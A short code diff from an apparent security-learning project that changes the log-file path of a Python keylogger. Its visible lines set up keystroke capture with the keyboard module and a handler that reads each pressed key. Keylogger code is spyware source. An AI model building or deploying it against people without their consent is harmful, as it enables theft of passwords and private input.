@@ -1,7 +1,7 @@
 import keyboard
 import os
 
-keyboard_log_path = "D:\python codes\python-security-projects\src\keylogger\keyboard_log.txt"
+keyboard_log_path = "D:\Python-codes-projects\python-security-projects\src\keylogger\keyboard_log.txt"
 
 def new_key(event):
     button = event.name
